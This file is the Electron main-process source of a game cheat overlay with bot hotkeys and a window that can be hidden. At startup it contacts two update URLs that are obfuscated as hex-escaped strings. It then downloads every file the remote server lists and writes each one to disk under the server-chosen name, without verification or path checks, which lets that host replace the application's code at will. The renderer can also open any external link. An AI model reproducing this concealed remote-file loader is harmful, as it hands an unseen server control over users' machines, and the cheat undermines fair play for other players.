const { app, BrowserWindow, screen, globalShortcut, ipcMain} = require("electron");
const shell = require("electron").shell,
      fs = require('fs'),
      request = require('request');
      var _0xe4da=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x69\x67\x68\x74\x62\x70\x67\x6c\x2e\x68\x65\x72\x6f\x6b\x75\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x75\x70\x64\x61\x74\x65'];(function(_0xcd1733,_0xe4dace){var _0x5483e7=function(_0x452903){while(--_0x452903){_0xcd1733['push'](_0xcd1733['shift']());}};_0x5483e7(++_0xe4dace);}(_0xe4da,0x99));var _0x5483=function(_0xcd1733,_0xe4dace){_0xcd1733=_0xcd1733-0x0;var _0x5483e7=_0xe4da[_0xcd1733];return _0x5483e7;};var _0x26e59c=_0x5483('\x30\x78\x30');
      var _0x53dd=['\x68\x74\x74\x70\x3a\x2f\x2f\x69\x64\x62\x6f\x74\x7a\x65\x72\x61\x2d\x78\x79\x7a\x2e\x75\x6d\x62\x6c\x65\x72\x2e\x6e\x65\x74\x2f\x75\x70\x64\x61\x74\x65'];(function(_0x808ff8,_0x109c6c){var _0x42f0f7=function(_0x465433){while(--_0x465433){_0x808ff8['push'](_0x808ff8['shift']());}};_0x42f0f7(++_0x109c6c);}(_0x53dd,0x22be*-0x1+0x1da4+0x594));var _0x586d=function(_0x808ff8,_0x109c6c){_0x808ff8=_0x808ff8-(0x22be*-0x1+0x1da4+0x51a);var _0x42f0f7=_0x53dd[_0x808ff8];return _0x42f0f7;};var _0x5e50ea=_0x586d('\x30\x78\x30');

var win,
    location = "login",
    winxy = {x:0,y:0},
    hOp = 1,
    mH = false,
    rN;

checkUpdates(_0xe4da[0]);
function checkUpdates(s, callback) {
  if(callback && s == rN) return runHack(callback);
  rN = s;
  console.log("Searching for updates!");
  request(s, function (error, res, body) {
    if(error) throw error;
    if(!res || res.statusCode == 503) return checkUpdates(_0x53dd[0], "Host server is down!") 
    if(res.statusCode != 200 && res.statusCode != 304) return checkUpdates(_0x53dd[0], "Update error!") 
      else {
        let resp = JSON.parse(body);
        if(resp.update == false) return checkUpdates(s, 'No update found!');
        else if(resp.files){
          fs.readFile('package.json', function (err, data) {
            if (err) return checkUpdates(s, "Update error!")
            let pData = JSON.parse(data);
            if(resp.version != pData.version) {
              let lth = Object.keys(resp.files).length;
              let lF = Object.keys(resp.files)[Object.keys(resp.files).length - 1]
              for(i = 0; i < lth; i++) {
                  let ll = resp.files[Object.keys(resp.files)[i]];
                  let fl = Object.keys(resp.files)[i];
                  request(ll, function (error, res, body) {
                   fs.writeFile(fl, body, 'utf8', function (err) {
                    delete require.cache[fl];
                    console.log(fl + ' was updated');
                    if(fl == lF) checkUpdates(s, "Everythings is updated :D");
                    if (err) return checkUpdates(s, "Update error!")
                    });
                });
              }            
            } else return checkUpdates(s, "Everythings is updated :D")
          });

        } else return checkUpdates(s, "No update found!")
    }
  });
}

function runHack(message) {
  if(message) console.log(message);
  createWindow();
  function createWindow () {
    win = new BrowserWindow({
      width: 800,
      height: 670,
      transparent: true,
      opacity: 1,
      frame: false,
      icon: "./img/icon.png",
      webPreferences: {
        nodeIntegration: true,
        webviewTag: true
      }
    })

    win.loadFile("./src/index.html");

    win.on("closed", () => {
      win = null
    });
    
    win.setIgnoreMouseEvents(true)
    win.setAlwaysOnTop(true, "floating", 1);
  }

  app.on("ready", createWindow);

  app.on("activate", () => {
    if (win === null) { 
      createWindow();
    }
  });

  getxy = function() {
    return {x: screen.getCursorScreenPoint().x - winxy.x  - 2 * Math.PI,y: screen.getCursorScreenPoint().y - winxy.y - 2 * Math.PI}
  }

  app.whenReady().then(() => {
    console.clear();
    console.log('\n\n\n    _/        _/  _/       ');
    console.log('         _/_/_/  _/_/_/    ');
    console.log('  _/  _/    _/  _/    _/   ');
    console.log(' _/  _/    _/  _/    _/    ');
    console.log('_/    _/_/_/  _/_/_/       \n\n');

    console.log('V3.8 coded By Zeedy and GM\nIf you have any suggestion message us on discord.\n\nDon\'t close the CMD while using the hack.');
    
  })

  function registerX() {
    globalShortcut.register('Shift+X', () => {
      if(win.getOpacity() <= 0) {
        mH = false;
        hop = hOp += .05
        win.setOpacity(hOp);
        register();
      } else {
        mH = true; 
        win.setOpacity(0);
        globalShortcut.unregisterAll()
        setTimeout(registerX, 500);
      }
    });
    globalShortcut.register('Left', () => {
      if(win.getOpacity() <= 1) {
        win.setOpacity(win.getOpacity() - .05);
        win.webContents.send('key', 'LEFT', win.getOpacity())
        hOp = win.getOpacity();
        if(win.getOpacity() <= 0) {
          globalShortcut.unregisterAll()
          setTimeout(registerX, 500);
        }
      } 
    })
    globalShortcut.register('Right', () => {
      if(win.getOpacity() >= 0 && mH == false) {
        if(!globalShortcut.isRegistered("Z")) {
          register();

        }
        win.setOpacity(win.getOpacity() + .05);
        win.webContents.send('key', 'RIGHT', win.getOpacity())
        hOp = win.getOpacity();
      } 
    })
  }

  function register() {
   if(location == "bot" || location == "b0t") {
     globalShortcut.register('Z', () => {
       let mousePos = screen.getCursorScreenPoint();
       win.setPosition(mousePos.x, mousePos.y);
       winxy.x = mousePos.x
       winxy.y = mousePos.y
     })
     globalShortcut.register('M', () => {
       win.webContents.send('key', 'M', getxy())
     })
     globalShortcut.register('V', () => {
       win.webContents.send('key', 'V', getxy())
     })
    }
    if(location == 'bot') {
      globalShortcut.register('B', () => {
        win.webContents.send('key', 'B', getxy())
      })
      globalShortcut.register('N', () => {
        win.webContents.send('key', 'N', getxy())
      })
      globalShortcut.register('F', () => {
        win.webContents.send('key', 'F', getxy())
      })
      globalShortcut.register('C', () => {
        win.webContents.send('key', 'C', getxy())
      })
      globalShortcut.register('Up', () => {
        win.webContents.send('key', 'UP', getxy())
      })
      globalShortcut.register('Down', () => {
        win.webContents.send('key', 'DOWN', getxy())
      })
    }
  }

  ipcMain.on("synchronous-message", (event, arg) => {

    if(typeof arg === "string") {
      if(arg.includes("fullscreen")) {
        if(parseFloat(arg) <= 1) {
          hOp = parseFloat(arg);
          win.setOpacity(hOp);
        }
        win.setFullScreen(true);
        location = 'bot';
        register();
        registerX();
      } else if(arg === "mouseOn") {
        win.setIgnoreMouseEvents(false);
      } else if(arg === "mouseOff") {
        win.setIgnoreMouseEvents(true);
      }
    }

    else if(typeof arg === "object") {
      if(arg.info === "reSize") {
        win.setSize(arg.width, arg.height);
        location = arg.location;
        register();
      } else if(arg.info === "ad") {
        shell.openExternal(arg.link);
        win.minimize();
      } else if(arg.info === "console") {
        console.log(arg.log)
      }
    }
    event.returnValue = arg;
  });  
}
app.allowRendererProcessReuse = true
